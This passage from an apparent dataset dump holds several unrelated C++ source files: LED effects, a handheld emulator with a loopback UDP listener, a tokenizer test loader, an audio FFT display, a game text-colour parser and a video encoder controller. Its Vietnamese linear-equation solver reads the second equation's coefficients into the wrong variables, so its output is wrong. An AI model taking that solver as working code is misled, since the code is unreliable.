LINEARBLEND);\n            colorIndex -= 3;\n        }\n\n        if (absSpeed > 2.f) std::fill_n(this->back_leds, NUM_BACK_LEDS, colorDarkRed);\n        else\n        {\n            for (int i = 0; i < NUM_BACK_LEDS; ++i)\n            {\n                this->back_leds[i] = ColorFromPalette(RainbowColors_p, colorIndex, 255, LINEARBLEND);\n                colorIndex -= 9;\n            }\n        }\n    }\n\n    int addIndex = static_cast<int>(std::round(spe",
    "#include \"cpu.h\"\n#include \"comm.h\"\n#include \"disassembler.h\"\n#include \"mem.h\"\n#include \"state.h\"\n#include <thread>\n#include <mutex>\n#include <unistd.h>\n#include \"nand.h\"\n#include \"nor.h\"\n#include <time.h>\n\n#if defined(__MINGW32__)\n#include <winsock2.h>\n#include <ws2tcpip.h>\ntypedef unsigned char u_int8_t;\ntypedef unsigned short u_int16_t;\ntypedef unsigned int u_int32_t;\ntypedef int socklen_t;\n#else\n#include <sys/socket.h>    //for socket ofcourse\n#include <sys/types.h>\n#include <sys/ioctl.h>\n#include <arpa/inet.h>\n#include <netinet/in.h>\n#endif\n\n#if defined(__MINGW32__)\ntypedef SOCKET my_fd_t;\ninline int sock_close(my_fd_t fd)\n{\n\treturn closesocket(fd);\n}\n#else\ntypedef int my_fd_t;\ninline int sock_close(my_fd_t fd)\n{\n\treturn close(fd);\n}\n\n#endif\n\n\n\n\nextern nc1020_states_t nc1020_states;\n\nstatic uint32_t& cycles = nc1020_states.cycles;\nstatic bool& should_irq = nc1020_states.should_irq;\nstatic bool& timer0_toggle = nc1020_states.timer0_toggle;\n\nstatic uint32_t& timer0_cycles = nc1020_states.timer0_cycles;\nstatic uint32_t& timer1_cycles = nc1020_states.timer1_cycles;\n\nstatic bool& should_wake_up = nc1020_states.should_wake_up;\n\nstatic uint16_t& reg_pc = nc1020_states.cpu.reg_pc;\nstatic uint8_t& reg_a = nc1020_states.cpu.reg_a;\nstatic uint8_t& reg_ps = nc1020_states.cpu.reg_ps;\nstatic uint8_t& reg_x = nc1020_states.cpu.reg_x;\nstatic uint8_t& reg_y = nc1020_states.cpu.reg_y;\nstatic uint8_t& reg_sp = nc1020_states.cpu.reg_sp;\n\nstatic int udp_fd;\nstatic struct sockaddr_in myaddr;\nstatic struct sockaddr_in remaddr;\n\nstring udp_msg;\nstd::mutex g_mutex;\n\nvoid read_loop(std::string msg)\n{\n\tchar buf[1000];\n\tsocklen_t addrlen = sizeof(remaddr);  \n\t\n\twhile(1){\n\t\tssize_t recvlen = recvfrom(udp_fd, buf, sizeof(buf)-1, 0, (struct sockaddr *)&remaddr, &addrlen);\n\t\tif(recvlen>0) {\n\t\t\tbuf[recvlen]=0;\n\t\t} \n\t\tg_mutex.lock();\n\t\tudp_msg=buf;\n\t\tg_mutex.unlock();\n\t}\n    //std::cout << \"task1 says: \" << msg;\n}\n\n\nvoid init_udp_server(){\n\tif ((udp_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {\n\t\tprintf(\"cannot create socket\");\n\t\treturn ;\n\t}\n\tprintf(\"create socket done\\n\");\n\tmemset((char *)&myaddr, 0, sizeof(myaddr));\n\tmyaddr.sin_family = AF_INET;\n\tmyaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n\tmyaddr.sin_port = htons(listen_port);\n\n\tif (bind(udp_fd, (struct sockaddr *)&myaddr, sizeof(myaddr)) < 0) {\n\t\tprintf(\"bind failed\");\n\t\tsock_close(udp_fd);\n\t\treturn ;\n\t}\n\t\n\tprintf(\"bind socket done\\n\");\n\n\tprintf(\"udp listening at %d!!!\\n\",listen_port);\n\tstd::thread task1(read_loop, \"hi\");\n\ttask1.detach();\n\treturn ;\n}\nvoid reset_cpu_states(){\n\tnc1020_states.should_irq = false;\n\tnc1020_states.cycles = 0;\n\tnc1020_states.cpu.reg_a = 0;\n\tnc1020_states.cpu.reg_ps = 0x24;\n\tnc1020_states.cpu.reg_x = 0;\n\tnc1020_states.cpu.reg_y = 0;\n\tnc1020_states.cpu.reg_sp = 0xFF;\n\tnc1020_states.cpu.reg_pc = PeekW(RESET_VEC);\n\tnc1020_states.timer0_cycles = CYCLES_TIMER0;\n\tnc1020_states.timer1_cycles = CYCLES_TIMER1;\n}\nvoid AdjustTime(){\n\tuint8_t* clock_buff = nc1020_states.clock_buff;\n    if (++ clock_buff[0] >= 60) {\n        clock_buff[0] = 0;\n        if (++ clock_buff[1] >= 60) {\n            clock_buff[1] = 0;\n            if (++ clock_buff[2] >= 24) {\n                clock_buff[2] &= 0xC0;\n                ++ clock_buff[3];\n            }\n        }\n    }\n}\n\nbool IsCountDown(){\n\tuint8_t* clock_buff = nc1020_states.clock_buff;\n\tuint8_t& clock_flags = nc1020_states.clock_flags;\n    if (!(clock_buff[10] & 0x02) ||\n        !(clock_flags & 0x02)) {\n        return false;\n    }\n    return (\n        ((clock_buff[7] & 0x80) && !(((clock_buff[7] ^ clock_buff[2])) & 0x1F)) ||\n        ((clock_buff[6] & 0x80) && !(((clock_buff[6] ^ clock_buff[1])) & 0x3F)) ||\n        ((clock_buff[5] & 0x80) && !(((clock_buff[5] ^ clock_buff[0])) & 0x3F))\n        );\n}\n\nvoid inject(){\n\tfor(int i=0;i<8;i++){\n\t\tfor(int j=0;j<=0xFE;j+=2){\n\t\t\tram_b[0x100*i+j]=j;\n\t\t\tram_b[0x100*i+j+1]=i;\n\t\t}\n\t}\n\n\tfor(int i=0;i<16;i++){\n\t\tprintf(\"<%x>\",ram_b[i]);\n\t}\n\tprintf(\"\\n\");\n\n\tmemcpy(nc1020_states.ext_ram, inject_code.c_str(), inject_code.size());\n\tram_io[0x00]=0x80;\n\tram_io[0x0a]=0x80;\n\t//Peek16(0xe3)=0x40;\n\t//ram_io[0x0d]&=0x5d;\n\tsuper_switch();\n\t//Peek16(0x280)=0xFF;\n\t//Peek16(0x281)=0xFF;\n\t//Peek16(0x282)=0xFF;\n\t//Peek16(0x283)=0xFF;\n\t//Peek16(0xe3)=0x40;\n\t//Peek16(0xe4)=0xb2;\n\t//nc1020_states.ext_ram[0x17]=0x58;\n\treg_pc=0x4018;\n}\n\nvector<string> split_s(const string &str, const string &sp) {\n    vector<string> res;\n    size_t i = 0, pos;\n    for (;; i = pos + sp.length()) {\n        pos = str.find(sp, i);\n        if (pos == string::npos) {\n\t\t\tstring s=str.substr(i, pos);\n            if(!s.empty()) res.push_back(s);\n            break;\n        } else {\n\t\t\tstring s=str.substr(i, pos - i);\n            if(!s.empty()) res.push_back(s);\n        }\n    }\n    return res;\n}\n\nvoid copy_to_addr(uint16_t addr, uint8_t * buf,uint16_t size){\n\tfor(uint32_t i=0;i<size;i++){\n\t\tPeek16(addr+i)=buf[i];\n\t}\n}\ndeque<char> queue;\nint32_t dummy_io_cnt=-1;\nbool dummy_io(uint16_t addr, uint8_t &value){\n\tif(addr!=0x3fff) return false;\n\tif(dummy",
    "#include \"llama.h\"\n#include \"common.h\"\n#include \"console.h\"\n\n#include <cstdio>\n#include <string>\n#include <map>\n#include <vector>\n#include <fstream>\n\n//static const std::map<std::string, std::vector<llama_token>> & k_tests() {\n//    static std::map<std::string, std::vector<llama_token>> _k_tests = {\n//        { \"\"                      , {  }, },\n//        { \" \"                     , {     220, }, },\n//        { \"  \"                    , {     256, }, },\n//        { \"   \"                   , {     262, }, },\n//        { \"\\t\"                    , {     197, }, },\n//        { \"\\n\"                    , {     198, }, },\n//        { \"\\n\\n\"                  , {     271, }, },\n//        { \"\\n\\n\\n\"                , {    1432, }, },\n//        { \"\\t\\n\"                  , {    1602, }, },\n//        { \"Hello world\"           , {    9906,   1917, }, },\n//        { \" Hello world\"          , {   22691,   1917, }, },\n//        { \"Hello World\"           , {    9906,   4435, }, },\n//        { \" Hello World\"          , {   22691,   4435, }, },\n//        { \" Hello World!\"         , {   22691,   4435,      0, }, },\n//        { \"Hello, world!\"         , {    9906,     11,   1917,      0, }, },\n//        { \" Hello, world!\"        , {   22691,     11,   1917,      0, }, },\n//        { \" this is \ud83e\udd99.cpp\"        , {     420,    374,  11410,     99,    247,     13,  11055, }, },\n//        { \"w048 7tuijk dsdfhu\"    , {      86,  23904,    220,     22,     83,   2005,  42908,  11729,   3013,  17156, }, },\n//        { \"\u043d\u0435\u0449\u043e \u043d\u0430 \u0411\u044a\u043b\u0433\u0430\u0440\u0441\u043a\u0438\"     , {   79862, 102118,  13373,  64571,  34694,   3114, 112203,  80112, }, },\n//        { \"\u1780\u17b6\u1793\u17cb\u178f\u17c2\u1796\u17b7\u179f\u17c1\u179f\u17a2\u17b6\u1785\u1781\u179b\u1785\u17c1\u1789\"   , {   21549,    222,  98629,    241,  45358,    233,  21549,    237,  45358,    224,  21549,    244,  21549,    115,  21549,    253,  45358,    223,  21549,    253,  21549,     95,  98629,    227,  21549,    223,  21549,    249,  21549,    227,  45358,    223,  21549,    231, }, },\n//        { \"\ud83d\ude80 (normal) \ud83d\ude36\u200d\ud83c\udf2b\ufe0f (multiple emojis concatenated) \u2705 (only emoji that has its own token)\", {    9468,    248,    222,    320,   8416,      8,  27623,    114, 102470,   9468,    234,    104,  31643,    320,  36773, 100166,  98634,      8,  26602,    227,    320,   3323,  43465,    430,    706,   1202,   1866,   4037,      8, }, },\n//        { \"Hello\"                 , {    9906, }, },\n//        { \" Hello\"                , {   22691, }, },\n//        { \"  Hello\"               , {     220,  22691, }, },\n//        { \"   Hello\"              , {     256,  22691, }, },\n//        { \"    Hello\"             , {     262,  22691, }, },\n//        { \"    Hello\\n    Hello\"  , {     262,  22691,    198,    262,  22691, }, },\n//        { \" (\"                    , {     320, }, },\n//        { \"\\n =\"                  , {     198,    284, }, },\n//        { \"' era\"                 , {       6,  11639, }, },\n//        { \"Hello, y'all! How are you \ud83d\ude01 ?\u6211\u60f3\u5728apple\u5de5\u4f5c1314151\u5929\uff5e\", {    9906,     11,    379,  65948,      0,   2650,    527,    499,  27623,    223,    949,  37046, 101067,  19000,  23182, 102301,   9263,  18136,     16,  36827,  21909, }, },\n//        { \"3\"                     , {      18, }, },\n//        { \"33\"                    , {    1644, }, },\n//        { \"333\"                   , {    8765, }, },\n//        { \"3333\"                  , {    8765,     18, }, },\n//        { \"33333\"                 , {    8765,   1644, }, },\n//        { \"333333\"                , {    8765,   8765, }, },\n//        { \"3333333\"               , {    8765,   8765,     18, }, },\n//        { \"33333333\"              , {    8765,   8765,   1644, }, },\n//        { \"333333333\"             , {    8765,   8765,   8765, }, },\n//    };\n//\n//    return _k_tests;\n//}\n\nusing llama_tests = std::map<std::string, std::vector<llama_token>>;\n\nstatic llama_tests read_tests(const std::string & fname_inp, const std::string & fname_out) {\n    llama_tests tests;\n\n    std::ifstream ifs_inp(fname_inp);\n    if (!ifs_inp) {\n        fprintf(stderr, \"%s : error: could not open file '%s'\\n\", __func__, fname_inp.c_str());\n        return tests;\n    }\n\n    std::string sraw((std::istreambuf_iterator<char>(ifs_inp)), std::istreambuf_iterator<char>());\n\n    std::ifstream ifs_out(fname_out);\n    if (!ifs_out) {\n        fprintf(stderr, \"%s : error: could not open file '%s'\\n\", __func__, fname_out.c_str());\n        return tests;\n    }\n\n    std::vector<std::string> sout;\n    for (std::string line; std::getline(ifs_out, line);) {\n        sout.push_back(line);\n    }\n\n    const std::string sep = \"\\n__ggml_vocab_test__\\n\";\n\n    std::vector<std::string> sinp;\n\n    size_t pos = 0;\n    while (pos < sraw.size()) {\n        const size_t next = sraw.find(sep, pos);\n        if (next == std::string::npos) {\n            sinp.push_back(sraw.substr(pos));\n            break;\n        }\n        sinp.push_back(sraw.substr(pos, next - pos));\n        pos = next + sep.size();\n    }\n\n    if (sinp.size() != sout.size()) {\n        fprintf(stderr, \"%s : error: input and output files have different number of test",
    "#include <Arduino.h>\n#include <M5Unified.h>\n#include \"arduinoFFT.h\"\n\n// ref:\n// https://ambidata.io/samples/m5stack/sound/\n\n#define MIC 33 // for Core2's PortA (Pin1)\n//#define SAMPLING_FREQUENCY 40000 // 40kHz\n#define SAMPLING_FREQUENCY 2000 // 2kHz\nconst uint16_t FFTsamples = 256;  // \u30b5\u30f3\u30d7\u30eb\u6570\u306f2\u306e\u3079\u304d\u4e57\n\ndouble vReal[FFTsamples];  // vReal[]\u306b\u30b5\u30f3\u30d7\u30ea\u30f3\u30b0\u3057\u305f\u30c7\u30fc\u30bf\u30fc\u3092\u5165\u308c\u308b\ndouble vImag[FFTsamples];\nArduinoFFT<double> FFT = ArduinoFFT<double>(vReal, vImag, FFTsamples, SAMPLING_FREQUENCY);  // FFT\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u3092\u4f5c\u308b\n\nunsigned int sampling_period_us;\n\nvoid sample(int nsamples) {\n\tfor (int i = 0; i < nsamples; i++) {\n\t\tunsigned long t = micros();\n\t\tvReal[i] = (double)analogRead(MIC) / 4095.0 * 3.6 + 0.1132; // ESP32\u306eADC\u306e\u7279\u6027\u3092\u88dc\u6b63\n\t\tvImag[i] = 0;\n\t\twhile ((micros() - t) < sampling_period_us) ;\n  }\n}\n\nint X0 = 30;\nint Y0 = 20;\nint _height = 240 - Y0;\nint _width = 320;\nfloat dmax = 5.0;\n\nvoid drawChart(int nsamples) {\n\tint band_width = floor(_width / nsamples);\n\tint band_pad = band_width - 1;\n\n\tfor (int band = 0; band < nsamples; band++) {\n\t\tint hpos = band * band_width + X0;\n\t\tfloat d = vReal[band];\n\t\tif (d > dmax) d = dmax;\n    int h = (int)((d / dmax) * (_height));\n\t\tM5.Lcd.fillRect(hpos, _height - h, band_pad, h, WHITE);\n    if ((band % (nsamples / 4)) == 0) {\n\t\t\tM5.Lcd.setCursor(hpos, _height + Y0 - 10);\n\t\t\tM5.Lcd.printf(\"%.1fkHz\", ((band * 1.0 * SAMPLING_FREQUENCY) / FFTsamples / 1000));\n\t\t}\n\t}\n}\n\nvoid setup() {\n\tM5.begin();\n//    M5.Speaker.write(0); // \u30b9\u30d4\u30fc\u30ab\u30fc\u3092\u30aa\u30d5\u3059\u308b\n//\tM5.Lcd.setBrightness(20);\n\tpinMode(MIC, INPUT);\n\n\tsampling_period_us = round(1000000 * (1.0 / SAMPLING_FREQUENCY));\n\tM5.Lcd.printf(\"%d\", SAMPLING_FREQUENCY);\n}\n\nvoid DCRemoval(double *vData, uint16_t samples) {\n\tdouble mean = 0;\n\tfor (uint16_t i = 1; i < samples; i++) {\n\t\tmean += vData[i];\n\t}\n\tmean /= samples;\n\tfor (uint16_t i = 1; i < samples; i++) {\n  \tvData[i] -= mean;\n\t}\n}\n\nuint8_t t = 0;\nvoid loop() {\n  sample(FFTsamples);\n  DCRemoval(vReal, FFTsamples);\n  FFT.windowing(FFT_WIN_TYP_HAMMING, FFT_FORWARD);  // \u7a93\u95a2\u6570\n  FFT.compute(FFT_FORWARD); // FFT\u51e6\u7406(\u8907\u7d20\u6570\u3067\u8a08\u7b97)\n  FFT.complexToMagnitude(); // \u8907\u7d20\u6570\u3092\u5b9f\u6570\u306b\u5909\u63db\n  M5.Lcd.fillScreen(BLACK);\n  drawChart(FFTsamples / 2);\n}\n",
    "#include \"tmuf.h\"\n\n#include \"../core/bulbtoys.h\"\n\n#include <string>\n\nstd::vector<ImGui::TMUF_TextSlice> ImGui::TMUF_Parse(const char* text)\n{\n\tstd::stringstream stream(text);\n\tstd::string buffer;\n\n\t// we will split our string into slices, based on what color they should be in\n\tstd::vector<ImGui::TMUF_TextSlice> slices;\n\n\t// things we need to remember when reading the stream\n\tbool link = false;\n\tbool bracket = false;\n\tbool capitalize = false;\n\tbool last_string_empty = false;\n\n\t// now we can remove any and all leftover instances of the non-supported tags, since we're lazy\n\tbool after_first = false;\n\twhile (std::getline(stream, buffer, '$'))\n\t{\n\t\tImVec4 color = { .0f, .0f, .0f, .0f };\n\n\t\t// if it's our first time in this loop\n\t\tif (!after_first)\n\t\t{\n\t\t\t// accounting for an empty vector of slices is just gonna result in uglier and more complicated code everywhere\n\t\t\t// fuck it, we're fine with empty slices in this one case, it's not worth the micro-optimization\n\t\t\t// also, we don't set 'last_string_empty' here, because it wasn't caused by a '$'\n\t\t\tslices.push_back({ buffer, color });\n\t\t\tafter_first = true;\n\t\t}\n\n\t\t// if it's not our first time in this loop, we found a '$' - what was next to it?\n\t\telse\n\t\t{\n\t\t\tchar c = buffer[0];\n\n\t\t\t// nothing (ie, another '$')\n\t\t\tif (!c)\n\t\t\t{\n\t\t\t\t// mark last string as empty\n\t\t\t\tif (!last_string_empty)\n\t\t\t\t{\n\t\t\t\t\tlast_string_empty = true;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\t// the first one escapes the other, so the other '$' is actually shown\n\t\t\t\t\tslices.back().str.append(\"$\");\n\n\t\t\t\t\t// stop adding additional '$'s\n\t\t\t\t\tlast_string_empty = false;\n\t\t\t\t}\n\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t// if last string was empty already, we ran into a '$$'\n\t\t\t// we don't care what was next to it, because we don't want to format anything with it anyways\n\t\t\tif (last_string_empty)\n\t\t\t{\n\t\t\t\t// the first one escapes the other, so the other '$' is actually shown\n\t\t\t\tslices.back().str.append(\"$\");\n\n\t\t\t\t// stop adding additional '$'s\n\t\t\t\tlast_string_empty = false;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t// default the color to be the same as the last slice\n\t\t\t\tcolor = slices.back().clr;\n\n\t\t\t\t// hex digit - beginning of a color\n\t\t\t\tif ((c >= '0' && c <= '9') ||\n\t\t\t\t\t(c >= 'A' && c <= 'F') ||\n\t\t\t\t\t(c >= 'a' && c <= 'f'))\n\t\t\t\t{\n\t\t\t\t\t// trackmania's color formatting is fucking stupid\n\t\t\t\t\t// it only checks if the first character is hexadecimal before initiating color mode\n\t\t\t\t\tauto get_color = +[](char c)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (c >= '0' && c <= '9')\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tc -= '0';\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if ((c >= 'A' && c <= 'F'))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tc -= 'A';\n\t\t\t\t\t\t\tc += 10;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if ((c >= 'a' && c <= 'f'))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tc -= 'a';\n\t\t\t\t\t\t\tc += 10;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse // everything else gets treated as black\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tc = 0;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\treturn float(c / 15.f);\n\t\t\t\t\t};\n\n\t\t\t\t\t// set R color value\n\t\t\t\t\tcolor.x = get_color(c);\n\n\t\t\t\t\t// if we find a '$' anywhere (in this case, a null character), bail custom coloring\n\t\t\t\t\tc = buffer[1];\n\t\t\t\t\tif (!c)\n\t\t\t\t\t{\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\n\t\t\t\t\t// set G color value\n\t\t\t\t\tcolor.y = get_color(c);\n\n\t\t\t\t\tc = buffer[2];\n\t\t\t\t\tif (!c)\n\t\t\t\t\t{\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n\n\t\t\t\t\t// set B color value\n\t\t\t\t\tcolor.z = get_color(c);\n\n\t\t\t\t\t// we set alpha to 1 to indicate a custom color is being passed (0 indicates default)\n\t\t\t\t\tcolor.w = 1.f;\n\n\t\t\t\t\t// erase the color characters\n\t\t\t\t\tbuffer.erase(0, 3);\n\t\t\t\t}\n\n\t\t\t\t// toggle link formatting\n\t\t\t\telse if (c == 'l' || c == 'L' || c == 'h' || c == 'H' || c == 'p' || c == 'P')\n\t\t\t\t{\n\t\t\t\t\tlink = !link;\n\n\t\t\t\t\tif (link)\n\t\t\t\t\t{\n\t\t\t\t\t\t// we just started a link, check for brackets\n\t\t\t\t\t\tc = buffer[1];\n\t\t\t\t\t\tif (!c)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t// even though we're not adding any text, get this - other tags STILL affect the output\n\t\t\t\t\t\tbracket = (c == '[');\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\t// we just ended a link, don't check for brackets, just remove the tag\n\t\t\t\t\t\tbuffer.erase(0, 1);\n\n\t\t\t\t\t\t// also, end bracket checking\n\t\t\t\t\t\tbracket = false;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t// toggle capitalization\n\t\t\t\telse if (c == 't' || c == 'T')\n\t\t\t\t{\n\t\t\t\t\tcapitalize = !capitalize;\n\t\t\t\t\tbuffer.erase(0, 1);\n\t\t\t\t}\n\n\t\t\t\t// reset ALL formatting\n\t\t\t\telse if (c == 'z' || c == 'Z')\n\t\t\t\t{\n\t\t\t\t\tcapitalize = false;\n\t\t\t\t\tlink = false;\n\t\t\t\t\tbracket = false;\n\t\t\t\t\tcolor = { .0f, .0f, .0f, .0f };\n\t\t\t\t\tbuffer.erase(0, 1);\n\t\t\t\t}\n\n\t\t\t\t// reset COLOR formatting\n\t\t\t\telse if (c == 'g' || c == 'G')\n\t\t\t\t{\n\t\t\t\t\tcolor = { .0f, .0f, .0f, .0f };\n\t\t\t\t\tbuffer.erase(0, 1);\n\t\t\t\t}\n\n\t\t\t\t// anything else, just discard the first character\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tbuffer.erase(0, 1);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// we have an open bracket - don't add any text until the bracket is closed\n\t\t\tif (bracket)\n\t\t\t{\n\t\t\t\tauto i = buffer.find(']');\n\t\t\t\tif (i == std::string::npos)\n\t\t\t\t{\n\t\t\t\t\t// empty the entire string\n\t\t\t\t\tbuffer = \"\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\t// remove everything inbetween brackets\n\t\t\t\t\tbuffer.erase(0, i + 1);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (capitalize)\n\t\t\t{\n\t\t\t\tstd::transform(buffer.begin(), buffer.end(), buffer.begin(), toupper);\n\t\t\t}\n\n\t\t\t// why does ImVec4 not have ope",
    "#include <iostream>\nusing namespace std;\n\nint main() {\n    double a, b, c, d, m, n;\n\n    // Nhap cac he so cho phuong trinh\n    cout << \"Nhap he so cho phuong trinh ax + by = m\" << endl;\n    cout << \"Nhap he so a: \";\n    cin >> a;\n    cout << \"Nhap he so b: \";\n    cin >> b;\n    cout << \"Nhap he so m: \";\n    cin >> m;\n    \n    cout << \"_______________\"<< endl;\n    \n    cout << \"Nhap he so cho phuong trinh cx + dy = n\" << endl;\n    cout << \"Nhap he so c: \";\n    cin >> a;\n    cout << \"Nhap he so d: \";\n    cin >> b;\n    cout << \"Nhap he so n: \";\n    cin >> m;\n\n\n    // Tinh dinh thuc cho he phuong trinh\n    double D = a * d - b * c;\n    double Dx = m * d - b * n;\n    double Dy = a * n - m * c;\n\n    // Kiem tra gia tri cua dinh thuc\n    if (D != 0) {\n        // He phuong trinh co nghiem duy nhat\n        double x = Dx / D;\n        double y = Dy / D;\n        cout << \"He phuong trinh co nghiem duy nhat:\" << endl;\n        cout << \"x = \" << x << endl;\n        cout << \"y = \" << y << endl;\n    } else {\n        if (Dx == 0 && Dy == 0) {\n            // He phuong trinh co vo so nghiem\n            cout << \"He phuong trinh co vo so nghiem.\" << endl;\n        } else {\n            // He phuong trinh vo nghiem\n            cout << \"He phuong trinh vo nghiem.\" << endl;\n        }\n    }\n\n    return 0;\n}\n\n\n",
    "/* The copyright in this software is being made available under the BSD\n * License, included below. This software may be subject to other third party\n * and contributor rights, including patent rights, and no such rights are\n * granted under this license.\n *\n * Copyright (c) 2010-2024, ITU/ISO/IEC\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n *  * Redistributions of source code must retain the above copyright notice,\n *    this list of conditions and the following disclaimer.\n *  * Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n *  * Neither the name of the ITU/ISO/IEC nor the names of its contributors may\n *    be used to endorse or promote products derived from this software without\n *    specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF\n * THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n/** \\file     EncModeCtrl.cpp\n    \\brief    Encoder controller for trying out specific modes\n*/\n\n#include \"EncModeCtrl.h\"\n\n#include \"AQp.h\"\n#include \"RateCtrl.h\"\n\n#include \"CommonLib/RdCost.h\"\n#include \"CommonLib/CodingStructure.h\"\n#include \"CommonLib/Picture.h\"\n#include \"CommonLib/UnitTools.h\"\n\n#include \"CommonLib/dtrace_next.h\"\n\n#include <cmath>\n\nstatic constexpr double UNSET_IMV_COST = MAX_DOUBLE * 0.125;   // Some large, unique value\n\nvoid EncModeCtrl::init( EncCfg *pCfg, RateCtrl *pRateCtrl, RdCost* pRdCost )\n{\n  m_pcEncCfg      = pCfg;\n  m_pcRateCtrl    = pRateCtrl;\n  m_pcRdCost      = pRdCost;\n  m_fastDeltaQP   = false;\n#if SHARP_LUMA_DELTA_QP\n  m_lumaQPOffset  = 0;\n\n  initLumaDeltaQpLUT();\n#endif\n  m_useHashMeInCurrentIntraPeriod = m_pcEncCfg->getUseHashMECfgEnable();\n  m_HashMEPOC = 0;\n  m_HashMEPOCchecked = false;\n  m_HashMEPOC2 = 0;\n}\n\nbool EncModeCtrl::tryModeMaster( const EncTestMode& encTestmode, const CodingStructure &cs, Partitioner& partitioner )\n{\n  return tryMode( encTestmode, cs, partitioner );\n}\n\nvoid EncModeCtrl::setEarlySkipDetected()\n{\n  m_ComprCUCtxList.back().earlySkip = true;\n}\n\nvoid EncModeCtrl::xExtractFeatures( const EncTestMode encTestmode, CodingStructure& cs )\n{\n  CHECK( cs.features.size() < NUM_ENC_FEATURES, \"Features vector is not initialized\" );\n\n  cs.features[ENC_FT_DISTORTION     ] = double( cs.dist              );\n  cs.features[ENC_FT_FRAC_BITS      ] = double( cs.fracBits          );\n  cs.features[ENC_FT_RD_COST        ] = double( cs.cost              );\n  cs.features[ENC_FT_ENC_MODE_TYPE  ] = double( encTestmode.type     );\n  cs.features[ENC_FT_ENC_MODE_OPTS  ] = double( encTestmode.opts     );\n}\n\nbool EncModeCtrl::nextMode( const CodingStructure &cs, Partitioner &partitioner )\n{\n  m_ComprCUCtxList.back().lastTestMode = m_ComprCUCtxList.back().testModes.back();\n\n  m_ComprCUCtxList.back().testModes.pop_back();\n\n  while( !m_ComprCUCtxList.back().testModes.empty() && !tryModeMaster( currTestMode(), cs, partitioner ) )\n  {\n    m_ComprCUCtxList.back().testModes.pop_back();\n  }\n\n  return !m_ComprCUCtxList.back().testModes.empty();\n}\n\nEncTestMode EncModeCtrl::currTestMode() const\n{\n  return m_ComprCUCtxList.back().testModes.back();\n}\n\nEncTestMode EncModeCtrl::lastTestMode() const\n{\n  return m_ComprCUCtxList.back().lastTestMode;\n}\n\nbool EncModeCtrl::anyMode() const\n{\n  return !m_ComprCUCtxList.back().testModes.empty();\n}\n\nvoid EncModeCtrl::setBest( CodingStructure& cs )\n{\n  if( cs.cost != MAX_DOUBLE && !cs.cus.empty() )\n  {\n    m_ComprCUCtxList.back().bestCS = &cs;\n    m_ComprCUCtxList.back().bestCU = cs.cus[0];\n    m_ComprCUCtxList.back().bestTU = cs.cus[0]->firstTU;\n    m_ComprCUCtxList.back().lastTestMode = getCSEncMode( cs );\n  }\n}\n\nvoid EncModeCtrl::xGetMinMaxQP( int& minQP, int& maxQP, const CodingStructure& cs, const Partitioner &partitioner, const int baseQP, const SPS& sps, const PPS& pps, const PartSplit splitMode )\n{\n  if( m_pcEncCfg->getUseRateCtrl() )\n  {\n    minQP = m_pcRateCtrl->getRCQP();\n    maxQP = m_pcRateCtrl->getRCQP();\n    return;\n  }\n\n  const unsigned subdivIncr = (splitMode == CU_QUAD_SPLIT) ? 2 : (splitMode == CU_BT_SPLIT) ? 1 : 0;\n  const bool qgEnabl",
